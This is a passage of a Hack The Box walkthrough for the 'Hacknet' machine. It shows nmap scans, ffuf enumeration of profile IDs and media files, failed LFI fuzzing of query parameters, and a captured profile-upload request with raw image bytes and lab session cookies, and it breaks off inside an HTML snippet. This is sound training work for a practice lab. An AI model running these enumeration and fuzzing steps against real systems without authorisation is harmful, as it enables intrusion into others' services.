---
title: "Hacknet"
date: 2025-09-27
slug: "hacknet"
tags: ["Unrated", "HTB", "Unknown-OS"]
difficulty: "Unrated"
platform: "HTB"
os: "Unknown-OS"
cover: "/images/hacknet/Pasted image 20250918104119.png"
summary: "Walkthrough of the Hacknet HTB machine covering recon, exploitation, and privilege escalation."
---
## Recon

```shell
nmap 10.129.121.182                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 21:27 EEST
Nmap scan report for 10.129.121.182
Host is up (0.64s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.58 seconds

```

```shell
nmap -p- 10.129.121.58 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 07:33 EEST
Nmap scan report for hacknet.htb (10.129.121.58)
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.07 seconds

```

```shell
nmap -p 22,80 -sC -sV 10.129.121.182 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 21:25 EEST
Nmap scan report for 10.129.121.182
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.55 seconds

```

Add to /etc/hosts

## Web

 It looks like a hack forum with an endpoint for profile management and profile icon upload, which I will try for a file upload.
 
### Subdomain Enumeration

There doesn't seem to be any subdomains:

```shell
ffuf -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -u http://hacknet.htb/ -H 'Host: FUZZ.hacknet.htb' -fs 169

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacknet.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/combined_subdomains.txt
 :: Header           : Host: FUZZ.hacknet.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 169
________________________________________________

:: Progress: [653920/653920] :: Job [1/1] :: 611 req/sec :: Duration: [0:18:48] :: Errors: 32 ::

```


### IDOR

Found this: `http://hacknet.htb/profile/18` maybe try enumerating profiles and check if there is a profile with some leaked creds in description

created a simple number list using bash:

```shell
for i in $(seq -50 1000); do echo $i >> numlist.txt; done 
```

then run ffuf 

```shell
ffuf -w numlist.txt -u 'http://hacknet.htb/profile/FUZZ' -r        

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacknet.htb/profile/FUZZ
 :: Wordlist         : FUZZ: /home/husmal/numlist.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

0                       [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 71ms]
6                       [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 70ms]
5                       [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 71ms]
3                       [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 71ms]
2                       [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 71ms]
4                       [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 71ms]
7                       [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 73ms]
10                      [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 71ms]
1                       [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 75ms]
9                       [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 72ms]
12                      [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 72ms]
14                      [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 71ms]

```

I appended -r at the end to follow redirect and even after filtering out size 667 nothing came back which is weird will try with burp intruder

![hacknet-1](/images/hacknet/Pasted image 20250918104119.png)

all of the valid profiles are from 1 to 25 with 27 being me

![hacknet-2](/images/hacknet/Pasted image 20250918104149.png)

![hacknet-3](/images/hacknet/Pasted image 20250918104207.png)


I will try to fuzz the profile pictures, as the source code of search endpoint indicates that the naming of the profiles are in numerical value and either jpg or png:

```html
<div id="user-list">
        
        <a href="[/profile/18](view-source:http://hacknet.htb/profile/18)" class="single-user">
            <img src="[/media/18.jpg](view-source:http://hacknet.htb/media/18.jpg)">
            <div class="info-block">
                <h3>backdoor_bandit</h3>
                <p>Specializes in creating and exploiting backdoors in systems. Always leaves a way back in after an at...</p>
            </div>
            <div class="user-buttons">
            </div>
        </a>
        
        <a href="[/profile/7](view-source:http://hacknet.htb/profile/7)" class="single-user">
            <img src="[/media/7.png](view-source:http://hacknet.htb/media/7.png)">
            <div class="info-block">
                <h3>blackhat_wolf</h3>
                <p>A black hat hacker with a passion for ransomware development. Has a reputation for leaving no trace ...</p>
            </div>
            <div class="user-buttons">
            </div>
        </a>
        
        <a href="[/profile/24](view-source:http://hacknet.htb/profile/24)" class="single-user">
            <img src="[/media/24.jpg](view-source:http://hacknet.htb/media/24.jpg)">
            <div class="info-block">
                <h3>brute_force</h3>
                <p>Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locke...</p>
            </div>
            <div class="user-buttons">
            </div>
        </a>
        
        <a href="[/profile/8](view-source:http://hacknet.htb/profile/8)" class="single-user">
            <img src="[/media/8.png](view-source:http://hacknet.htb/media/8.png)">
            <div class="info-block">
                <h3>bytebandit</h3>
                <p>A skilled penetration tester and ethical hacker. Enjoys dismantling security systems and exposing th...</p>
            </div>
            <div class="user-buttons">
            </div>
        </a>
        
        <a href="[/profile/12](view-source:http://hacknet.htb/profile/12)" class="single-user">
            <img src="[/media/12.png](view-source:http://hacknet.htb/media/12.png)">
            <div class="info-block">
                <h3>codebreaker</h3>
                <p>A programmer with a talent for writing malicious code and cracking software protections. Loves break...</p>
            </div>
            <div class="user-buttons">
            </div>
        </a>
        
        <a href="[/profile/5](view-source:http://hacknet.htb/profile/5)" class="single-user">
            <img src="[/media/5.jpg](view-source:http://hacknet.htb/media/5.jpg)">
            <div class="info-block">
                <h3>cryptoraven</h3>
                <p>Cryptography expert with a love for breaking and creating secure communication protocols. Always one...</p>
            </div>
            <div class="user-buttons">
            </div>
        </a>
        
        <a href="[/profile/1](view-source:http://hacknet.htb/profile/1)" class="single-user">
            <img src="[/media/1.jpg](view-source:http://hacknet.htb/media/1.jpg)">
            <div class="info-block">
                <h3>cyberghost</h3>
                <p>A digital nomad with a knack for uncovering vulnerabilities in the deep web. Passionate about crypto...</p>
            </div>
            <div class="user-buttons">
            </div>
        </a>
        
        <a href="[/profile/15](view-source:http://hacknet.htb/profile/15)" class="single-user">
            <img src="[/media/15.png](view-source:http://hacknet.htb/media/15.png)">
            <div class="info-block">
                <h3>darkseeker</h3>
                <p>A hacker who thrives in the dark web. Specializes in anonymity tools and hidden service exploitation...</p>
            </div>
            <div class="user-buttons">
            </div>
        </a>
        
        <a href="[/profile/10](view-source:http://hacknet.htb/profile/10)" class="single-user">
            <img src="[/media/10.png](view-source:http://hacknet.htb/media/10.png)">
            <div class="info-block">
                <h3>datadive</h3>
                <p>A data miner and analyst with a focus on extracting and analyzing large datasets from breached datab...</p>
            </div>
            <div class="user-buttons">
            </div>
        </a>
        
        <a href="[/profile/22](view-source:http://hacknet.htb/profile/22)" class="single-user">
            <img src="[/media/22.png](view-source:http://hacknet.htb/media/22.png)">
            <div class="info-block">
                <h3>deepdive</h3>
                <p>Specializes in deep web exploration and data extraction. Always looking for hidden gems in the darke...</p>
            </div>
            <div class="user-buttons">
            </div>
        </a>
        
    </div>
```

so I will run these ffuf commands:

```shell
ffuf -w numlist.txt -u 'http://hacknet.htb/media/FUZZ.png' 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacknet.htb/media/FUZZ.png
 :: Wordlist         : FUZZ: /home/husmal/numlist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

9                       [Status: 200, Size: 36452, Words: 123, Lines: 117, Duration: 64ms]
13                      [Status: 200, Size: 27004, Words: 86, Lines: 102, Duration: 103ms]
12                      [Status: 200, Size: 45487, Words: 114, Lines: 158, Duration: 64ms]
14                      [Status: 200, Size: 53535, Words: 211, Lines: 197, Duration: 65ms]
7                       [Status: 200, Size: 94614, Words: 355, Lines: 322, Duration: 62ms]
8                       [Status: 200, Size: 149779, Words: 537, Lines: 631, Duration: 66ms]
10                      [Status: 200, Size: 183855, Words: 646, Lines: 692, Duration: 64ms]
16                      [Status: 200, Size: 136146, Words: 441, Lines: 501, Duration: 68ms]
11                      [Status: 200, Size: 283168, Words: 1410, Lines: 1140, Duration: 95ms]
22                      [Status: 200, Size: 485165, Words: 2930, Lines: 2232, Duration: 118ms]
15                      [Status: 200, Size: 613912, Words: 2571, Lines: 2477, Duration: 67ms]
:: Progress: [1051/1051] :: Job [1/1] :: 597 req/sec :: Duration: [0:00:02] :: Errors: 0 ::

```

```shell
ffuf -w numlist.txt -u 'http://hacknet.htb/media/FUZZ.jpg' 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacknet.htb/media/FUZZ.jpg
 :: Wordlist         : FUZZ: /home/husmal/numlist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

1                       [Status: 200, Size: 21757, Words: 87, Lines: 62, Duration: 64ms]
6                       [Status: 200, Size: 24702, Words: 47, Lines: 77, Duration: 66ms]
2                       [Status: 200, Size: 55143, Words: 212, Lines: 248, Duration: 64ms]
3                       [Status: 200, Size: 54125, Words: 248, Lines: 209, Duration: 65ms]
20                      [Status: 200, Size: 69454, Words: 272, Lines: 298, Duration: 64ms]
25                      [Status: 200, Size: 78229, Words: 284, Lines: 340, Duration: 64ms]
21                      [Status: 200, Size: 44124, Words: 150, Lines: 150, Duration: 68ms]
24                      [Status: 200, Size: 53737, Words: 195, Lines: 228, Duration: 66ms]
19                      [Status: 200, Size: 56468, Words: 256, Lines: 219, Duration: 66ms]
17                      [Status: 200, Size: 80001, Words: 307, Lines: 312, Duration: 66ms]
18                      [Status: 200, Size: 57952, Words: 261, Lines: 246, Duration: 68ms]
23                      [Status: 200, Size: 87627, Words: 304, Lines: 356, Duration: 68ms]
5                       [Status: 200, Size: 94658, Words: 334, Lines: 411, Duration: 65ms]
4                       [Status: 200, Size: 136521, Words: 429, Lines: 431, Duration: 65ms]
:: Progress: [1051/1051] :: Job [1/1] :: 632 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

```

The combination of both justifies 25 profile accounts exactly, however they are just regular images

Try to extract data from them using steghide:

```shell
for file in *; do steghide extract -p 'hacknet' -sf "$file"; done
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: the file format of the file "8.png" is not supported.
steghide: could not extract any data with that passphrase!
steghide: the file format of the file "10.png" is not supported.
steghide: the file format of the file "11.png" is not supported.
steghide: the file format of the file "12.png" is not supported.
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: the file format of the file "15.png" is not supported.
steghide: the file format of the file "16.png" is not supported.
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: the file format of the file "22.png" is not supported.
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
                                                            
```

even with an empty passphrase it didn't work
### LFI

 I went to the blogs under `explore` and tried to perform LFI on page parameter`http://hacknet.htb/explore?page=2` , and there is also `http://hacknet.htb/messages?tab=sent` with response:

![hacknet-4](/images/hacknet/Pasted image 20250917215918.png)


I will check for LFI on the endpoints mentioned through LFI wordlist:

#### Explore Endpoint
There doesn't seem to be LFI on explore with page parameter:

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u 'http://hacknet.htb/explore?page=FUZZ' -fs 0 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacknet.htb/explore?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

:: Progress: [9513/9513] :: Job [1/1] :: 576 req/sec :: Duration: [0:00:17] :: Errors: 0 ::

```

there is also nothing but the page parameter:

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://hacknet.htb/explore?FUZZ=1' -fs 0 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacknet.htb/explore?FUZZ=1
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

:: Progress: [6453/6453] :: Job [1/1] :: 540 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

so explore endpoint does not expose LFI

trying again for `/explore?page` because results from ffuf are not the same as from Zaproxy

fuzzing for more params yielded nothing as all invalid params lead to page 1 (I fuzzed for value =2 that is how I distinguished between original response and fuzzed)

There is also no LFI for `page` parameter because all the responses had the same size
#### Messages endpoint
Now for the messages endpoint with tab param, I will look for more params

```shell
ffuf -w /usr/share/seclists/Fuzzing/LFI/fuzz-lfi-params-list.txt -u 'http://hacknet.htb/messages?FUZZ=sent' -r  -fs 667

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacknet.htb/messages?FUZZ=sent
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/fuzz-lfi-params-list.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 667
________________________________________________

:: Progress: [2589/2589] :: Job [1/1] :: 298 req/sec :: Duration: [0:00:09] :: Errors: 0 ::

```

```shell
cat /usr/share/seclists/Fuzzing/LFI/fuzz-lfi-params-list.txt | grep tab
tab
table
database
tables
databases
tablename
tableName
tableprefix
tableId
subtab
tableFields
tabid
parenttab
intDatabaseIndex

```

```shell
ffuf -w /usr/share/seclists/Fuzzing/LFI/fuzz-lfi-params-list.txt -u 'http://hacknet.htb/messages?FUZZ=sent' -r  -fs 667 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacknet.htb/messages?FUZZ=sent
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/fuzz-lfi-params-list.txt
 :: Header           : User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 667
________________________________________________

:: Progress: [2589/2589] :: Job [1/1] :: 271 req/sec :: Duration: [0:00:10] :: Errors: 0 ::

```

There is definitely something wrong, I will redo the LFI checks with Zaproxy

![hacknet-5](/images/hacknet/Pasted image 20250918104842.png)

the tab looks clean for now, try with a larger LFI fuzzing list `/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt` ... clean again

Now check for params other than tab with the list `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`...nothing from zap, all gave same response

![hacknet-6](/images/hacknet/Pasted image 20250918105717.png)


### File Upload

 When updating anything in the profile, a POST request is sent. In this case I am updating my profile icon:

```HTTP
POST /profile/edit HTTP/1.1
Host: hacknet.htb
Content-Length: 5021
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://hacknet.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxOAKL90KC4Dl0ZQ5
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://hacknet.htb/profile/edit
Accept-Encoding: gzip, deflate, br
Cookie: csrftoken=CPinWS6qG4Y31SsC55vIf0x9sMqPgqjH; sessionid=dz1tu9tuzx9yhb9tbo7lh175c7236tr3
Connection: keep-alive

------WebKitFormBoundaryxOAKL90KC4Dl0ZQ5
Content-Disposition: form-data; name="csrfmiddlewaretoken"

vh92d6qUcoS51745lZd3y3l8VwC55SX7XWhfZOmaIiGYSPmxgUyBDTI7d8SKb86E
------WebKitFormBoundaryxOAKL90KC4Dl0ZQ5
Content-Disposition: form-data; name="picture"; filename="1.jpg"
Content-Type: image/jpeg

ÿØÿà JFIF  H H  ÿá Exif  MM *         ÿþ Created with The GIMPÿÛ C 


	

!

"$"
$


ÿÛ C


















































ÿÀ   È" ÿÄ 
           	ÿÄ ;  		     !1"AQ2#$3BCRa	&8Db
¡´ÿÄ                 ÿÄ                 ÿÚ 
  ? ã                                                                        E
ËÈ-,}²ò[nTÞÂôÍ)DKw¶+â5q/'­¼ê:%Ò{lbó&¯ëçz¦ÓûÙ	IìwÖhkí7	Jä¢2ûHõùÑ7Iá­ÿ öþÕýÇzaÓûÜº
w7)KÍ¿fljå×êc*"K
mâQ©2Qu¾DDe£eþ;cêê+:ã6#wSþdó"ä^KÉ
wéÂUM¿R-a-(
§ÖRJ"ZÊfGàüx1dywÑÌ;ÖeÅ,ùPØ1ÓuÔ²¨&á£¶f\À¿B^fs«êU7â¹²e-©ëjó;D´
(Ýi¤ø#RÓ¢ýÓIþF­uSkI`ºûÉµ³×8òØSN'ªTDd;?,Èrj©>®7Md9%löª#Ø?¼¶¬ ¤BSjA´­,ZýÒÙæú½©OÔj&ß_[%úÒc¢ñÔ¹:
n-Õzg_¼¤¨Ö~vzQÏ[ EYô³ß
³'÷o|ô»°hìv9ö»åê¹}Üw®
u±så´µ­YÜâ×°]×nLº÷Zi{øÒÔ#ÿ È¹úxíLëÔõíØÙ7ÕèÊ
ÍqñBI¡³ÞJVøó¯dy_E³
¾Æ7Pð·Y¹´W²Ôí|âqôè¢¥i#I¡iJ¶"ÑkÎÏAÏ]
éÔ®©õ&!
[Ð}§9¸!1PÔ¢ZÒJNkà¶´ü
ÏNºQ.Â~e7ªÈ(%Òá³²L=
ã8ëI¾IuSFf²=hÌÓàËF%þ§¿êWm¹ÆfZ%Ç¸iKÉ8Î©(Qïq-ÿ y)?!·ô.wRis~¢YgKÈÓÀéµðÕ~N­âB
mH4÷¶jo/ZÚLù¨z¿Çr
}QÓ}EgRrQÜ`¦ÄqêÌd\Éy!Þ¹Bwíâ·«¨$ó9é¯tã^ç
:ÿ ]â» s.útÄîzk&á]Rb
sÝ7\LFK Ö­§Êø~^¹Õ=V;&+þ ¬mò8ñ*XýìuJ~ÎÉ§Eµ/GäÉ^@=@l]Mb<^¤äñ¢Ö»W
mµ	ÒI.2	å4®¤í%ö2ñàÌ¼t                fÄ¶µW:®%Øð,;~¶+O©-Ií«}Äé|Tfe²=@6ªÚÖ§Õû]Ø
²2âJôÏ©¾û
×6ÄË¢ÚOdz-{µ¯±û¹ÍöSêý}^¿Çw·¾<øý¼µ½xÞ
ÔLZ§¡=,É«àöm¯½ßÜ¤wV®ÿ bRP×ÚfiOÚE¿ÎÌo¿Wý"ÅðÛÜôö2¨!ºÛ]ç
8RÒ^m|RÁÆÜ/&z%$Ëó £Y¶fÍûùYuûwR¿`C¤$)Î\DDD[?"6íg»ag6Lé'dHuN8³ýT¥ÿ oõ¯¥{ú¸é¿M¨ÔPqý,^ú¨:âÔã3$©J3Qøø/Á¬Ã¡Ù5/;"
b9<:Þ'ddËvën§ü
·¯3]·spÝ:iµÄÊ)
&
A'<Hß
ç
µ½xØË¿Ër¬+/²k«hñÏlµ6s¯¡¿ûIj2/ ¾ú±ÐLf¦FºìÏ
¬.ª¥«Ft·dÎ}÷É§gFmdd¶
K##Jx¶³$¼øu»éÆWxâú)Ö4:Å~RåÊD§É&M¸hR{&Ú­ñ2>'ðGà¢ISR¢>ìy
¬Ó­,Ò´(¼2ýHMÎÍ³9Ó_7.¿*DW>óÖO-Çb(ö¨êQ«fÑí3?°{M¯ót÷ßlÆ}§ö»ÒzîÂ½ß¿èùö»ãéxýÜw¾~u¡¸\}0õ
¶}­aÚb²­`1ê­dg.{DZ
A)I-v¢NÔ"ß
9îÖ¾Çì^ç7Ú}O«ô=õz~ÿ 

ÞÞøóãöòÖõãzÖmYUí5¹C
¿\}${7g_§¨ÿ CjÍº-âJòÉSñû¤"5¶)ýkªøD¤´
oÆÏFd+@KRµ-j5)Gµ(Ïfgú               
ð"J:<1.K©elÖã«Qé(JKÊfdDEäÌÀx ÷T	Ò ÎôYqS/°ófZOJB~R¢222?$d<
Éè[=O¶ªôíÑê¸p¤O¯÷¿[§Ò§cw%¡M÷G´rIÈ¶^HYyÿ Pñcú¬Íkl-aZ`ë¬¤ÄYF¢²MÉBÒfLºF{ó­+ò9ÆûÈèýö?mTÔÒR¢¹6¥òN¹
d\¹'zÞ¹ê"@u·S°Ú/­,ÊúEE?yP´X
t4)q#5¥³þ²Sf
¥'½ÇälS`ÙO¥ºúq¯eK*û¯Ó±=4IB©\|«iIèÌClºXupm%ÖMÃ¹è¥:ÂÔÚ¸¹ÛYÅFDz3Ñø0·Tj±ÿ éæQ¨Ø­lj|jªÒ
*;»nºä[q('Mg£/µ
2ØÝza(º|2óN¾âùV
Uï²¼z5£6¤¡¢aiþÉøý4~
Ìr8ÍSk2®u¤JÉ² Wöýl¦RÜWû"Ò9(f[?Ì÷j¯æ{ì^ç
Ý¿Wè{éõ
oáÝíï_o-k~7±n
_ûDK'<¢ñò.%gëÛô^ÓÃ]Þ\?´û~{ÇÈä môÒæ¶?ÓÇX«gÚÄfÆÅTªé	KÒMÖ§
´í|RdjÑ
É                 u!Ón`½_Áñk« .¡1e[6A"3j¬iãq·Sÿ Äæ¢ÒIe²ÚfEäG#¬&µÍqî¦døLîoÈg=1d3èS<êHÉfá%$iFÒ¥$fe³0÷WHbf]Fêi#&G_ÏÜ,n¸åÏù¾µ¨Z4¡)I¤ÍJ-}Ä^?38×Gp
g7Â2ùº
Æö=dJÛzæ¢ÍbÏ¼ÚØïÈäU¤ämþÒ"3=j8¿^k`ßg5öÊ¢ã&E"î,;e
Ç¯ÊUÅdh4fiÚHüèæCÕì$ï1êìú©y
$
o)ìè¤¨aFjCL%]¾fGáfde­lFcëPzãaI6ß«÷S.É2ëe©ÆO¥öÐL×¶2i­jY|6Ù|Ôó¾SRu¦ð¡»ÇÇ3YÍFì[Å(¶pÿ ¬6ÓÈZM<IDN$Ò®:=ühÏß§ÝiÆ)sÞ§Ï±C«Í&¹&4úW[fÎ}C¥)5+yJÒ÷|lxuG­µ7ÅÓ)t1²§áve¸åä²äÈeÆMOr5-F¾í¥$>)Ù  é}þ¢õk
zeba3kN:¸o'LÑ¥$Èþî$3ø26í_³K
ñë}7½Ûpôy÷ýÅ¾ÆùxáÝíóüðå¯:3:ÁÑè¶]AºÇñµlÚÂ,¥8ÂÛ*NiJûJY£3QqI%:32º£[èô(f9eØÌ,$¥ÍÉÈm-¨f~¥m%£?õõKûü©ÞþÈ~Ó{·½Øûïºv=?¿ÿ -Ûû¸rîþÿ püìaôîÜzÕ;ß{ºí
ÑýF,®&÷e)Ö×ô5É
KÏÈÇë½ïNrÌEk.LÛ­Íe¸´­%¶f®<Ýóÿ §_åæµT}
ê.
.<ÕÏÉý³Ñ8Òm7é¤)×;j#-¤ËZ%yù×È
B/Gú?Ã§ô·ÙFXÅÆmC_*+QZaÆãJF\Q¤²¥%("5£!#£ý?r5Çê²¹æ_"ÂÄÕ
´V¼ê"}¶¿Ä5 Ï%hþ
_ýP Ô^älÃ³LL2¢Ú	ÇW
ã[¦Ñô¤ÛÈÒf$AAÕ

EêÖFô;5DÌê.aW!
 Üis
%´n¯II}ÜMFGðFc¡ý&Â3º
Ö¬êJ®,['>®©¯_qHA<áD¤ËFe£1
t«©¢Êò~ªÜ[Ä¨¡¼V>Û­¶©2æ£f²I¹öRß>K^w|Cê­Ç°DÌo>?b,7ëªlÅ\¶ÛYsyÄN¸iÙð=%G¢Qëc	È«úÇRilp
Ï#Äl²ßÇse
±®ú&ÍMOi4ù$ñ?C]ô7
´>1ÓÛû	ç½aÊLô%)a¨ëIÿ fÙ-5ËJAñ2#/óuÅ.m3
ªÐ¯aÕÆ²½ÇûS
m&|	\Imõ¢5ä¾ODy}hÊÿ sè¯°Ñ®¢ÃfÂaÓÍ|yä8¤R~
q	pÕ¢ûT¥h¼×zãÓµ:«b¼ë·«QÑûZiGóÀ%w¸þ7ò                            IãÙö;-Rñû»:*O;RØYèjAèF 
«K	ö³Ýi:Lé
Ý~KªqÅêjQñ                                                                                                           ?ÿÙ
------WebKitFormBoundaryxOAKL90KC4Dl0ZQ5
Content-Disposition: form-data; name="email"


------WebKitFormBoundaryxOAKL90KC4Dl0ZQ5
Content-Disposition: form-data; name="username"


------WebKitFormBoundaryxOAKL90KC4Dl0ZQ5
Content-Disposition: form-data; name="password"


------WebKitFormBoundaryxOAKL90KC4Dl0ZQ5
Content-Disposition: form-data; name="about"


------WebKitFormBoundaryxOAKL90KC4Dl0ZQ5
Content-Disposition: form-data; name="is_public"

on
------WebKitFormBoundaryxOAKL90KC4Dl0ZQ5--
```

Read the page source of `/profile/edit`:

```html
<div id="profile">
    <div id="profile-picture">
        <img src="[/media/profile.png](view-source:http://hacknet.htb/media/profile.png)">
    </div>
    <form id="profile-info" action="[edit](view-source:http://hacknet.htb/profile/edit)" method="POST" enctype="multipart/form-data">
